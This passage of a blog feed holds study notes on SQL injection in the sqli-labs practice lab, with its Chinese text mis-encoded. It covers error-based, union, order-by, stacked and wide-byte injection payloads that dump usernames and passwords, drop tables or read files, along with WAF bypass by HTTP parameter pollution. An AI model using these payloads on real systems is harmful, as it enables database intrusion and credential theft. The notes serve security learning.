class="headerlink" title="å¸ƒçˆ¾æ³¨å…¥ï¼š"></a>å¸ƒçˆ¾æ³¨å…¥ï¼š</h4><p>æš«æ™‚æ²’æœ‰æˆåŠŸéŽå…ˆè·³éŽé€™å€‹æ–¹æ³•</p><h4 id="äºŒæ¬¡æŸ¥è©¢æ³¨å…¥ï¼š"><a href="#äºŒæ¬¡æŸ¥è©¢æ³¨å…¥ï¼š" class="headerlink" title="äºŒæ¬¡æŸ¥è©¢æ³¨å…¥ï¼š"></a>äºŒæ¬¡æŸ¥è©¢æ³¨å…¥ï¼š</h4><pre><code>admin') union select 1,2 from (select count(*),concat((select concat(username,0x3a, password) from security.users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a #</code></pre><h4 id="æ‰€ä»¥åœ¨åå››é—œä½¿ç”¨é€™æ¨£çš„èªžå¥ï¼š"><a href="#æ‰€ä»¥åœ¨åå››é—œä½¿ç”¨é€™æ¨£çš„èªžå¥ï¼š" class="headerlink" title="æ‰€ä»¥åœ¨åå››é—œä½¿ç”¨é€™æ¨£çš„èªžå¥ï¼š"></a>æ‰€ä»¥åœ¨åå››é—œä½¿ç”¨é€™æ¨£çš„èªžå¥ï¼š</h4><pre><code>admin" and extractvalue(1,concat(0x23,(select username from users limit 0,1)))-- </code></pre><pre><code>admin" and updatexml(1,concat(0x23,(select username from users limit 0,1)),1)-- </code></pre><pre><code>admin" union select (exp(~(select * from (select username from users limit 0,1))),2-- </code></pre><pre><code>admin" and if(substr(database(),1,1)='s',1,sleep(5))-- </code></pre><pre><code>admin" union select 1,2 from (select count(*),concat((select concat(username,0x3a,password) from security.users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a #</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL:sqlilabs less-1-4:unionæ³¨å…¥</title>
      <link href="2021/07/16/sql-sqlilabs-less-1-4-union-zhu-ru/"/>
      <url>2021/07/16/sql-sqlilabs-less-1-4-union-zhu-ru/</url>
      
        <content type="html"><![CDATA[<p>çˆ†æ•°æ®çš„é¡ºåºå°±æ˜¯â‘ schema_name â‘¡table_name â‘¢column_nameâ‘£æŠŠusernameè¿žåŒpasswordç”¨group_concatå‡½æ•°è¿žæŽ¥</p><p>+â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€“+</p><p>â‘ ?id=-1â€™union select 1,group_concat(username,0x3a,password),3 from usersâ€“+</p><p>â‘¡?id=-1 union select 1,group_concat(username,0x3a,password),3 from usersâ€“+</p><p>â‘¢?id=-1â€™) union select 1,group_concat(username,0x3a,password),3 from usersâ€“+</p><p>â‘£?id=-1â€) union select 1,group_concat(username,0x3a,password),3 from usersâ€“+</p><p>æ€»ä¹‹å°±æ˜¯â€œ?id=â€åŽä¸æŠ¥é”™çš„è¯­å¥åŠ ä¸Šè¯­å¥â€œunion select 1,group_concat(username,0x3a,password),3 from usersâ€“+â€</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL:background-9:order byåŽæ³¨å…¥åŽŸç†</title>
      <link href="2021/07/16/sql-background-9-order-by-hou-zhu-ru-yuan-li/"/>
      <url>2021/07/16/sql-background-9-order-by-hou-zhu-ru-yuan-li/</url>
      
        <content type="html"><![CDATA[<p>æ¢äº†æ–°èŠ±æ ·äº†ï¼Œæç¤ºè¯´æœ‰sortå‚æ•°ï¼Œsortä¸å°±æ˜¯æŽ’åºçš„æ„æ€å—ï¼Ÿå°†sortæ¢æˆ1,2,3ï¼ŒæŸ¥çœ‹å›žæ˜¾ç»“æžœï¼Œä¸å¤ªä¸€æ ·ï¼Œå½“sortä¸º4æ—¶ï¼Œå°±å›žæ˜¾ä¸å­˜åœ¨4åˆ—ï¼ŒæŸ¥çœ‹å›žæ˜¾ç»“æžœä¹Ÿä¸éš¾çœ‹å‡ºï¼Œä¸€å…±å°±ä¸‰åˆ—ï¼Œidï¼Œusernameï¼Œpasswordï¼Œsortå€¼ä¸ºå‡ ï¼Œå°±æ ¹æ®å“ªä¸ªè¿›è¡ŒæŽ’åºï¼ŒæŽ¨æµ‹sortå€¼å‰ä¸ºorder by</p><pre><code>http://192.168.239.138:86/Less-46/?sort=1</code></pre><p>é‚£ä¹ˆï¼ŒåŸºäºŽorder byçš„SQLæ³¨å…¥æµ‹è¯•æ–¹æ³•å¦‚ä¸‹ï¼Œæ˜¾ç¤ºç»“æžœä¸åŒï¼ˆæ‰§è¡Œäº†ç”¨æˆ·è¾“å…¥çš„è¯­å¥ï¼‰ï¼Œåˆ™è¡¨æ˜Žå¯ä»¥æ³¨å…¥</p><pre><code>?sort=1 desc?sort=1 asc</code></pre><p>æ˜¯å¦ä¸ºæ•°å­—æ³¨å…¥ï¼Œæ˜¾ç¤ºç»“æžœä¸åŒï¼Œåˆ™ä¸ºæ•°å­—æ³¨å…¥ï¼Œç›¸åŒï¼Œåˆ™å¾€ä¸‹è¿›è¡Œ</p><pre><code>?sort=right(version(),1)?sort=left(version(),1)</code></pre><p>æ˜¯å¦ä¸ºå¸ƒå°”ç±»åž‹ï¼Œæ­¤æ—¶æˆ‘ä»¬å¯ä»¥ç”¨æŠ¥é”™æ³¨å…¥å’Œå»¶æ—¶æ³¨å…¥</p><pre><code>?sort=rand(true)?sort=rand(false)</code></pre><p>true å’Œfalseç»“æžœæ˜¯ä¸åŒçš„</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL:background-8:å †å æ³¨å…¥åŽŸç†</title>
      <link href="2021/07/16/sql-background-8-dui-die-zhu-ru-yuan-li/"/>
      <url>2021/07/16/sql-background-8-dui-die-zhu-ru-yuan-li/</url>
      
        <content type="html"><![CDATA[<p>Stacked  injections:å †å æ³¨å…¥ã€‚ä»Žåè¯çš„å«ä¹‰å°±å¯ä»¥çœ‹åˆ°åº”è¯¥æ˜¯ä¸€å †sqlè¯­å¥ï¼ˆå¤šæ¡ï¼‰ä¸€èµ·æ‰§è¡Œã€‚è€Œåœ¨çœŸå®žçš„è¿ç”¨ä¸­ä¹Ÿæ˜¯è¿™æ ·çš„ï¼Œæˆ‘ä»¬çŸ¥é“åœ¨mysqlä¸­ï¼Œä¸»è¦æ˜¯å‘½ä»¤è¡Œä¸­ï¼Œæ¯ä¸€æ¡è¯­å¥ç»“å°¾åŠ  ; è¡¨ç¤ºè¯­å¥ç»“æŸã€‚è¿™æ ·æˆ‘ä»¬å°±æƒ³åˆ°äº†æ˜¯ä¸æ˜¯å¯ä»¥å¤šå¥ä¸€èµ·ä½¿ç”¨ã€‚è¿™ä¸ªå«åšstacked injectionã€‚</p><h3 id="0x01-åŽŸç†ä»‹ç»"><a href="#0x01-åŽŸç†ä»‹ç»" class="headerlink" title="0x01 åŽŸç†ä»‹ç»"></a>0x01 åŽŸç†ä»‹ç»</h3><p>åœ¨SQLä¸­ï¼Œåˆ†å·ï¼ˆ;ï¼‰æ˜¯ç”¨æ¥è¡¨ç¤ºä¸€æ¡sqlè¯­å¥çš„ç»“æŸã€‚è¯•æƒ³ä¸€ä¸‹æˆ‘ä»¬åœ¨ ;  ç»“æŸä¸€ä¸ªsqlè¯­å¥åŽç»§ç»­æž„é€ ä¸‹ä¸€æ¡è¯­å¥ï¼Œä¼šä¸ä¼šä¸€èµ·æ‰§è¡Œï¼Ÿå› æ­¤è¿™ä¸ªæƒ³æ³•ä¹Ÿå°±é€ å°±äº†å †å æ³¨å…¥ã€‚è€Œunion  injectionï¼ˆè”åˆæ³¨å…¥ï¼‰ä¹Ÿæ˜¯å°†ä¸¤æ¡è¯­å¥åˆå¹¶åœ¨ä¸€èµ·ï¼Œä¸¤è€…ä¹‹é—´æœ‰ä»€ä¹ˆåŒºåˆ«ä¹ˆï¼ŸåŒºåˆ«å°±åœ¨äºŽunion æˆ–è€…union  allæ‰§è¡Œçš„è¯­å¥ç±»åž‹æ˜¯æœ‰é™çš„ï¼Œå¯ä»¥ç”¨æ¥æ‰§è¡ŒæŸ¥è¯¢è¯­å¥ï¼Œè€Œå †å æ³¨å…¥å¯ä»¥æ‰§è¡Œçš„æ˜¯ä»»æ„çš„è¯­å¥ã€‚</p><p>ä¾‹å¦‚ä»¥ä¸‹è¿™ä¸ªä¾‹å­ã€‚</p><p><img src="https://images2015.cnblogs.com/blog/669054/201608/669054-20160811220533906-1304680635.png" alt="img"></p><p>å½“æ‰§è¡ŒæŸ¥è¯¢åŽï¼Œç¬¬ä¸€æ¡æ˜¾ç¤ºæŸ¥è¯¢ä¿¡æ¯ï¼Œç¬¬äºŒæ¡åˆ™å°†æ•´ä¸ªè¡¨è¿›è¡Œåˆ é™¤ã€‚</p><h3 id="0x02-å †å æ³¨å…¥çš„å±€é™æ€§"><a href="#0x02-å †å æ³¨å…¥çš„å±€é™æ€§" class="headerlink" title="0x02 å †å æ³¨å…¥çš„å±€é™æ€§"></a>0x02 å †å æ³¨å…¥çš„å±€é™æ€§</h3><p>å †å æ³¨å…¥çš„å±€é™æ€§åœ¨äºŽå¹¶ä¸æ˜¯æ¯ä¸€ä¸ªçŽ¯å¢ƒä¸‹éƒ½å¯ä»¥æ‰§è¡Œï¼Œå¯èƒ½å—åˆ°APIæˆ–è€…æ•°æ®åº“å¼•æ“Žä¸æ”¯æŒçš„é™åˆ¶ï¼Œå½“ç„¶äº†æƒé™ä¸è¶³ä¹Ÿå¯ä»¥è§£é‡Šä¸ºä»€ä¹ˆæ”»å‡»è€…æ— æ³•ä¿®æ”¹æ•°æ®æˆ–è€…è°ƒç”¨ä¸€äº›ç¨‹åºã€‚</p><p><img src="https://images2015.cnblogs.com/blog/669054/201608/669054-20160811220534984-271396471.png" alt="img"></p><p>Psï¼šæ­¤å›¾æ˜¯ä»ŽåŽŸæ–‡ä¸­æˆªå–è¿‡æ¥çš„ï¼Œå› ä¸ºæˆ‘ä¸ªäººçš„æµ‹è¯•çŽ¯å¢ƒæ˜¯php+mysqlï¼Œæ˜¯å¯ä»¥æ‰§è¡Œçš„ï¼Œæ­¤å¤„å¯¹äºŽmysql/phpå­˜åœ¨è´¨ç–‘ã€‚ä½†ä¸ªäººä¼°è®¡åŽŸæ–‡ä½œè€…å¯èƒ½ä¸Žæˆ‘çš„ç‰ˆæœ¬çš„ä¸åŒçš„åŽŸå› ã€‚</p><p>è™½ç„¶æˆ‘ä»¬å‰é¢æåˆ°äº†å †å æŸ¥è¯¢å¯ä»¥æ‰§è¡Œä»»æ„çš„sqlè¯­å¥ï¼Œä½†æ˜¯è¿™ç§æ³¨å…¥æ–¹å¼å¹¶ä¸æ˜¯ååˆ†çš„å®Œç¾Žçš„ã€‚åœ¨æˆ‘ä»¬çš„webç³»ç»Ÿä¸­ï¼Œå› ä¸ºä»£ç é€šå¸¸åªè¿”å›žä¸€ä¸ªæŸ¥è¯¢ç»“æžœï¼Œå› æ­¤ï¼Œå †å æ³¨å…¥ç¬¬äºŒä¸ªè¯­å¥äº§ç”Ÿé”™è¯¯æˆ–è€…ç»“æžœåªèƒ½è¢«å¿½ç•¥ï¼Œæˆ‘ä»¬åœ¨å‰ç«¯ç•Œé¢æ˜¯æ— æ³•çœ‹åˆ°è¿”å›žç»“æžœçš„ã€‚</p><p>å› æ­¤ï¼Œåœ¨è¯»å–æ•°æ®æ—¶ï¼Œæˆ‘ä»¬å»ºè®®ä½¿ç”¨unionï¼ˆè”åˆï¼‰æ³¨å…¥ã€‚åŒæ—¶åœ¨ä½¿ç”¨å †å æ³¨å…¥ä¹‹å‰ï¼Œæˆ‘ä»¬ä¹Ÿæ˜¯éœ€è¦çŸ¥é“ä¸€äº›æ•°æ®åº“ç›¸å…³ä¿¡æ¯çš„ï¼Œä¾‹å¦‚è¡¨åï¼Œåˆ—åç­‰ä¿¡æ¯ã€‚</p><h3 id="0x03-å„ä¸ªæ•°æ®åº“å®žä¾‹ä»‹ç»"><a href="#0x03-å„ä¸ªæ•°æ®åº“å®žä¾‹ä»‹ç»" class="headerlink" title="0x03 å„ä¸ªæ•°æ®åº“å®žä¾‹ä»‹ç»"></a>0x03 å„ä¸ªæ•°æ®åº“å®žä¾‹ä»‹ç»</h3><p>æœ¬èŠ‚æˆ‘ä»¬ä»Žå¸¸ç”¨æ•°æ®åº“è§’åº¦å‡ºå‘ï¼Œä»‹ç»å‡ ä¸ªç±»åž‹çš„æ•°æ®åº“çš„ç›¸å…³ç”¨æ³•ã€‚æ•°æ®åº“çš„åŸºæœ¬æ“ä½œï¼Œå¢žåˆ æŸ¥æ”¹ã€‚ä»¥ä¸‹åˆ—å‡ºæ•°æ®åº“ç›¸å…³å †å æ³¨å…¥çš„åŸºæœ¬æ“ä½œã€‚</p><p><strong>Mysqlæ•°æ®åº“</strong></p><p>ï¼ˆ1ï¼‰æ–°å»ºä¸€ä¸ªè¡¨</p><p>select * from users where id=1;create table test like users;</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202004/1375459-20200408181511625-1655980737.png" alt="img"></p><p>æ‰§è¡ŒæˆåŠŸï¼Œæˆ‘ä»¬å†åŽ»çœ‹ä¸€ä¸‹æ˜¯å¦æ–°å»ºæˆåŠŸè¡¨ã€‚</p><p>show tables;</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202004/1375459-20200408181539058-1361406792.png" alt="img"></p><p>ï¼ˆ2ï¼‰åˆ é™¤ä¸Šé¢æ–°å»ºçš„testè¡¨</p><p>select * from users where id=1;drop table test;</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202004/1375459-20200408181625779-1824771503.png" alt="img"></p><p>æŸ¥çœ‹æ˜¯å¦åˆ é™¤æˆåŠŸ</p><p>show tables;</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202004/1375459-20200408181702371-256896974.png" alt="img"></p><p>ï¼ˆ3ï¼‰æŸ¥è¯¢æ•°æ®</p><p>select * from users where id=1;select 1,2,3;</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202004/1375459-20200408181751702-1896581718.png" alt="img"></p><p>ï¼ˆ4ï¼‰åŠ è½½æ–‡ä»¶</p><p>select * from users where id=1;select load_file(â€˜c:/test.phpâ€™);</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202004/1375459-20200408181938100-2055788800.png" alt="img"></p><p>ï¼ˆ5ï¼‰ä¿®æ”¹æ•°æ®</p><p>select * from users where id=1;insert into users(id,username,password) values(â€˜100â€™,â€™newâ€™,â€™newâ€™);</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202004/1375459-20200408182020578-971023255.png" alt="img"></p><p>æŸ¥çœ‹æ˜¯å¦æ’å…¥æˆåŠŸã€‚</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202004/1375459-20200408182104745-1282485266.png" alt="img"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL:background-7:å®½å­—èŠ‚æ³¨å…¥åŽŸç†</title>
      <link href="2021/07/16/sql-background-7-kuan-zi-jie-zhu-ru-yuan-li/"/>
      <url>2021/07/16/sql-background-7-kuan-zi-jie-zhu-ru-yuan-li/</url>
      
        <content type="html"><![CDATA[<p>åŽŸç†ï¼šmysqlåœ¨ä½¿ç”¨GBKç¼–ç çš„æ—¶å€™ï¼Œä¼šè®¤ä¸ºä¸¤ä¸ªå­—ç¬¦ä¸ºä¸€ä¸ªæ±‰å­—ï¼Œä¾‹å¦‚%aa%5cå°±æ˜¯ä¸€ä¸ªæ±‰å­—ï¼ˆå‰ä¸€ä¸ªasciiç å¤§äºŽ128æ‰èƒ½åˆ°æ±‰å­—çš„èŒƒå›´ï¼‰ã€‚æˆ‘ä»¬åœ¨è¿‡æ»¤ â€˜ çš„æ—¶å€™ï¼Œå¾€å¾€åˆ©ç”¨çš„æ€è·¯æ˜¯å°† â€˜ è½¬æ¢ä¸º ' ï¼ˆè½¬æ¢çš„å‡½æ•°æˆ–è€…æ€è·¯ä¼šåœ¨æ¯ä¸€å…³é‡åˆ°çš„æ—¶å€™ä»‹ç»ï¼‰ã€‚</p><p>å› æ­¤æˆ‘ä»¬åœ¨æ­¤æƒ³åŠžæ³•å°† â€˜ å‰é¢æ·»åŠ çš„ \ é™¤æŽ‰ï¼Œä¸€èˆ¬æœ‰ä¸¤ç§æ€è·¯ï¼š</p><ol><li>%dfåƒæŽ‰ \ å…·ä½“çš„åŽŸå› æ˜¯urlencode(') =  %5c%27ï¼Œæˆ‘ä»¬åœ¨%5c%27å‰é¢æ·»åŠ %dfï¼Œå½¢æˆ%df%5c%27ï¼Œè€Œä¸Šé¢æåˆ°çš„mysqlåœ¨GBKç¼–ç æ–¹å¼çš„æ—¶å€™ä¼šå°†ä¸¤ä¸ªå­—èŠ‚å½“åšä¸€ä¸ªæ±‰å­—ï¼Œæ­¤äº‹%df%5cå°±æ˜¯ä¸€ä¸ªæ±‰å­—ï¼Œ%27åˆ™ä½œä¸ºä¸€ä¸ªå•ç‹¬çš„ç¬¦å·åœ¨å¤–é¢ï¼ŒåŒæ—¶ä¹Ÿå°±è¾¾åˆ°äº†æˆ‘ä»¬çš„ç›®çš„ã€‚</li><li>å°† ' ä¸­çš„ \ è¿‡æ»¤æŽ‰ï¼Œä¾‹å¦‚å¯ä»¥æž„é€  %**%5c%5c%27çš„æƒ…å†µï¼ŒåŽé¢çš„%5cä¼šè¢«å‰é¢çš„%5cç»™æ³¨é‡ŠæŽ‰ã€‚è¿™ä¹Ÿæ˜¯bypassçš„ä¸€ç§æ–¹æ³•ã€‚</li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL:background-6:æœåŠ¡å™¨ä¸¤å±‚æž¶æž„ä»‹ç»</title>
      <link href="2021/07/16/sql-background-6-fu-wu-qi-liang-ceng-jia-gou-jie-shao/"/>
      <url>2021/07/16/sql-background-6-fu-wu-qi-liang-ceng-jia-gou-jie-shao/</url>
      
        <content type="html"><![CDATA[<p>æœåŠ¡å™¨ç«¯æœ‰ä¸¤ä¸ªéƒ¨åˆ†ï¼šç¬¬ä¸€éƒ¨åˆ†ä¸ºtomcatä¸ºå¼•æ“Žçš„jspåž‹æœåŠ¡å™¨ï¼Œç¬¬äºŒéƒ¨åˆ†ä¸ºapacheä¸ºå¼•æ“Žçš„phpæœåŠ¡å™¨ï¼ŒçœŸæ­£æä¾›webæœåŠ¡çš„æ˜¯phpæœåŠ¡å™¨ã€‚å·¥ä½œæµç¨‹ä¸ºï¼šclientè®¿é—®æœåŠ¡å™¨ï¼Œèƒ½ç›´æŽ¥è®¿é—®åˆ°tomcatæœåŠ¡å™¨ï¼Œç„¶åŽtomcatæœåŠ¡å™¨å†å‘apacheæœåŠ¡å™¨è¯·æ±‚æ•°æ®ã€‚æ•°æ®è¿”å›žè·¯å¾„åˆ™ç›¸åã€‚</p><p>æ­¤å¤„ç®€å•ä»‹ç»ä¸€ä¸‹ç›¸å…³çŽ¯å¢ƒçš„æ­å»ºã€‚çŽ¯å¢ƒä¸ºubuntu14.04ã€‚æ­¤å¤„ä»¥æˆ‘æ­å»ºçš„çŽ¯å¢ƒä¸ºä¾‹ï¼Œæˆ‘ä»¬éœ€è¦ä¸‹è½½ä¸‰ä¸ªä¸œè¥¿ï¼štomcatæœåŠ¡å™¨ã€jdkã€mysql-connector-java.åˆ†åˆ«å®‰è£…ï¼Œæ­¤å¤„è¦æ³¨æ„jdkå®‰è£…åŽè¦exportçŽ¯å¢ƒå˜é‡ï¼Œmysql-connector-javaéœ€è¦å°†jaræ–‡ä»¶å¤åˆ¶åˆ°jdkçš„ç›¸å…³ç›®å½•ä¸­ã€‚æŽ¥ä¸‹æ¥å°†tomcat-files.zipè§£åŽ‹åˆ°tomcatæœåŠ¡å™¨webapp/ROOTç›®å½•ä¸‹ï¼Œæ­¤å¤„éœ€è¦è¯´æ˜Žçš„æ˜¯éœ€è¦ä¿®æ”¹æºä»£ç ä¸­æ­£ç¡®çš„è·¯å¾„å’Œmysqlç”¨æˆ·åå¯†ç ã€‚åˆ°è¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥æ­£å¸¸è®¿é—®29-32å…³äº†ã€‚ï¼ˆPSï¼šæˆ‘æ²¡æœ‰è¿™æ ·åšï¼Œæˆ‘è¿˜æ˜¯ç”¨çš„Windows+wampçŽ¯å¢ƒï¼‰</p><p>é‡ç‚¹ï¼šindex.php?id=1&amp;id=2ï¼Œä½ çŒœçŒœåˆ°åº•æ˜¯æ˜¾ç¤ºid=1çš„æ•°æ®è¿˜æ˜¯æ˜¾ç¤ºid=2çš„ï¼Ÿ</p><p>Explainï¼šapacheï¼ˆphpï¼‰è§£æžæœ€åŽä¸€ä¸ªå‚æ•°ï¼Œå³æ˜¾ç¤ºid=2çš„å†…å®¹ã€‚Tomcatï¼ˆjspï¼‰è§£æžç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå³æ˜¾ç¤ºid=1çš„å†…å®¹ã€‚</p><p>æ­¤å¤„æˆ‘ä»¬æƒ³ä¸€ä¸ªé—®é¢˜ï¼šindex.jsp?id=1&amp;id=2è¯·æ±‚ï¼Œé’ˆå¯¹ç¬¬ä¸€å¼ å›¾ä¸­çš„æœåŠ¡å™¨é…ç½®æƒ…å†µï¼Œå®¢æˆ·ç«¯è¯·æ±‚é¦–å…ˆè¿‡tomcatï¼Œtomcatè§£æžç¬¬ä¸€ä¸ªå‚æ•°ï¼ŒæŽ¥ä¸‹æ¥tomcatåŽ»è¯·æ±‚apacheï¼ˆphpï¼‰æœåŠ¡å™¨ï¼Œapacheè§£æžæœ€åŽä¸€ä¸ªå‚æ•°ã€‚é‚£æœ€ç»ˆè¿”å›žå®¢æˆ·ç«¯çš„åº”è¯¥æ˜¯å“ªä¸ªå‚æ•°ï¼Ÿ</p><p>Answerï¼šæ­¤å¤„åº”è¯¥æ˜¯id=2çš„å†…å®¹ï¼Œåº”ä¸ºæ—¶é—´ä¸Šæä¾›æœåŠ¡çš„æ˜¯apacheï¼ˆphpï¼‰æœåŠ¡å™¨ï¼Œè¿”å›žçš„æ•°æ®ä¹Ÿåº”è¯¥æ˜¯apacheå¤„ç†çš„æ•°æ®ã€‚è€Œåœ¨æˆ‘ä»¬å®žé™…åº”ç”¨ä¸­ï¼Œä¹Ÿæ˜¯æœ‰ä¸¤å±‚æœåŠ¡å™¨çš„æƒ…å†µï¼Œé‚£ä¸ºä»€ä¹ˆè¦è¿™ä¹ˆåšï¼Ÿæ˜¯å› ä¸ºæˆ‘ä»¬å¾€å¾€åœ¨tomcatæœåŠ¡å™¨å¤„åšæ•°æ®è¿‡æ»¤å’Œå¤„ç†ï¼ŒåŠŸèƒ½ç±»ä¼¼ä¸ºä¸€ä¸ªWAFã€‚è€Œæ­£å› ä¸ºè§£æžå‚æ•°çš„ä¸åŒï¼Œæˆ‘ä»¬æ­¤å¤„å¯ä»¥åˆ©ç”¨è¯¥åŽŸç†ç»•è¿‡WAFçš„æ£€æµ‹ã€‚è¯¥ç”¨æ³•å°±æ˜¯HPPï¼ˆHTTP Parameter Pollutionï¼‰ï¼Œhttpå‚æ•°æ±¡æŸ“æ”»å‡»çš„ä¸€ä¸ªåº”ç”¨ã€‚HPPå¯å¯¹æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯éƒ½èƒ½å¤Ÿé€ æˆä¸€å®šçš„å¨èƒã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL:background-5:HTTPé ­éƒ¨ä»‹ç´¹</title>
      <link href="2021/07/16/sql-background-5-http-tou-bu-jie-shao/"/>
      <url>2021/07/16/sql-background-5-http-tou-bu-jie-shao/</url>
      
        <content type="html"><![CDATA[<p>HTTPå¤´éƒ¨è¯¦è§£</p><p>1ã€ Acceptï¼šå‘Šè¯‰WEBæœåŠ¡å™¨è‡ªå·±æŽ¥å—ä»€ä¹ˆä»‹è´¨ç±»åž‹ï¼Œ*/* è¡¨ç¤ºä»»ä½•ç±»åž‹ï¼Œtype/* è¡¨ç¤ºè¯¥ç±»åž‹ä¸‹çš„æ‰€æœ‰å­ç±»åž‹ï¼Œtype/sub-typeã€‚</p><p>2ã€ Accept-Charsetï¼š æµè§ˆå™¨ç”³æ˜Žè‡ªå·±æŽ¥æ”¶çš„å­—ç¬¦é›†</p><ul><li>Accept-Encodingï¼š æµè§ˆå™¨ç”³æ˜Žè‡ªå·±æŽ¥æ”¶çš„ç¼–ç æ–¹æ³•ï¼Œé€šå¸¸æŒ‡å®šåŽ‹ç¼©æ–¹æ³•ï¼Œæ˜¯å¦æ”¯æŒåŽ‹ç¼©ï¼Œæ”¯æŒä»€ä¹ˆåŽ‹ç¼©æ–¹æ³•ï¼ˆgzipï¼Œdeflateï¼‰</li><li>Accept-Languageï¼šæµè§ˆå™¨ç”³æ˜Žè‡ªå·±æŽ¥æ”¶çš„è¯­è¨€</li><li>è¯­è¨€è·Ÿå­—ç¬¦é›†çš„åŒºåˆ«ï¼šä¸­æ–‡æ˜¯è¯­è¨€ï¼Œä¸­æ–‡æœ‰å¤šç§å­—ç¬¦é›†ï¼Œæ¯”å¦‚big5ï¼Œgb2312ï¼Œgbkç­‰ç­‰ã€‚</li></ul><p>3ã€ Accept-Rangesï¼šWEBæœåŠ¡å™¨è¡¨æ˜Žè‡ªå·±æ˜¯å¦æŽ¥å—èŽ·å–å…¶æŸä¸ªå®žä½“çš„ä¸€éƒ¨åˆ†ï¼ˆæ¯”å¦‚æ–‡ä»¶çš„ä¸€éƒ¨åˆ†ï¼‰çš„è¯·æ±‚ã€‚</p><ul><li>bytesï¼šè¡¨ç¤ºæŽ¥å—</li><li>noneï¼šè¡¨ç¤ºä¸æŽ¥å—ã€‚</li></ul><p>4ã€ Ageï¼šå½“ä»£ç†æœåŠ¡å™¨ç”¨è‡ªå·±ç¼“å­˜çš„å®žä½“åŽ»å“åº”è¯·æ±‚æ—¶ï¼Œç”¨è¯¥å¤´éƒ¨è¡¨æ˜Žè¯¥å®žä½“ä»Žäº§ç”Ÿåˆ°çŽ°åœ¨ç»è¿‡å¤šé•¿æ—¶é—´äº†ã€‚</p><p>5ã€ Authorizationï¼šå½“å®¢æˆ·ç«¯æŽ¥æ”¶åˆ°æ¥è‡ªWEBæœåŠ¡å™¨çš„ WWW-Authenticate å“åº”æ—¶ï¼Œç”¨è¯¥å¤´éƒ¨æ¥å›žåº”è‡ªå·±çš„èº«ä»½éªŒè¯ä¿¡æ¯ç»™WEBæœåŠ¡å™¨ã€‚</p><p>6ã€ Cache-Controlï¼š</p><ul><li>è¯·æ±‚ï¼š<ul><li>no-cacheï¼šï¼ˆä¸è¦ç¼“å­˜çš„å®žä½“ï¼Œè¦æ±‚çŽ°åœ¨ä»ŽWEBæœåŠ¡å™¨åŽ»å–ï¼‰</li><li>max-ageï¼šï¼ˆåªæŽ¥å— Age å€¼å°äºŽ max-age å€¼ï¼Œå¹¶ä¸”æ²¡æœ‰è¿‡æœŸçš„å¯¹è±¡ï¼‰</li><li>max-staleï¼šï¼ˆå¯ä»¥æŽ¥å—è¿‡åŽ»çš„å¯¹è±¡ï¼Œä½†æ˜¯è¿‡æœŸæ—¶é—´å¿…é¡»å°äºŽ max-stale å€¼ï¼‰</li><li>min-freshï¼šï¼ˆæŽ¥å—å…¶æ–°é²œç”Ÿå‘½æœŸå¤§äºŽå…¶å½“å‰ Age è·Ÿ min-fresh å€¼ä¹‹å’Œçš„ç¼“å­˜å¯¹è±¡ï¼‰</li></ul></li><li>å“åº”ï¼š<ul><li>publicï¼š(å¯ä»¥ç”¨ Cached å†…å®¹å›žåº”ä»»ä½•ç”¨æˆ·)</li><li>privateï¼šï¼ˆåªèƒ½ç”¨ç¼“å­˜å†…å®¹å›žåº”å…ˆå‰è¯·æ±‚è¯¥å†…å®¹çš„é‚£ä¸ªç”¨æˆ·ï¼‰</li><li>no-cacheï¼šï¼ˆå¯ä»¥ç¼“å­˜ï¼Œä½†æ˜¯åªæœ‰åœ¨è·ŸWEBæœåŠ¡å™¨éªŒè¯äº†å…¶æœ‰æ•ˆåŽï¼Œæ‰èƒ½è¿”å›žç»™å®¢æˆ·ç«¯ï¼‰</li><li>max-ageï¼šï¼ˆæœ¬å“åº”åŒ…å«çš„å¯¹è±¡çš„è¿‡æœŸæ—¶é—´ï¼‰</li></ul></li><li>ALL:<ul><li>no-storeï¼ˆä¸å…è®¸ç¼“å­˜ï¼‰</li></ul></li></ul><p>7ã€ Connectionï¼š</p><ul><li>è¯·æ±‚ï¼š<ul><li>closeï¼šï¼ˆå‘Šè¯‰WEBæœåŠ¡å™¨æˆ–è€…ä»£ç†æœåŠ¡å™¨ï¼Œåœ¨å®Œæˆæœ¬æ¬¡è¯·æ±‚çš„å“åº”åŽï¼Œæ–­å¼€è¿žæŽ¥ï¼Œä¸è¦ç­‰å¾…æœ¬æ¬¡è¿žæŽ¥çš„åŽç»­è¯·æ±‚äº†ï¼‰ã€‚</li><li>keepaliveï¼šï¼ˆå‘Šè¯‰WEBæœåŠ¡å™¨æˆ–è€…ä»£ç†æœåŠ¡å™¨ï¼Œåœ¨å®Œæˆæœ¬æ¬¡è¯·æ±‚çš„å“åº”åŽï¼Œä¿æŒè¿žæŽ¥ï¼Œç­‰å¾…æœ¬æ¬¡è¿žæŽ¥çš„åŽç»­è¯·æ±‚ï¼‰ã€‚</li></ul></li><li>å“åº”ï¼š<ul><li>closeï¼šï¼ˆè¿žæŽ¥å·²ç»å…³é—­ï¼‰ã€‚</li><li>keepaliveï¼šï¼ˆè¿žæŽ¥ä¿æŒç€ï¼Œåœ¨ç­‰å¾…æœ¬æ¬¡è¿žæŽ¥çš„åŽç»­è¯·æ±‚ï¼‰ã€‚</li><li>K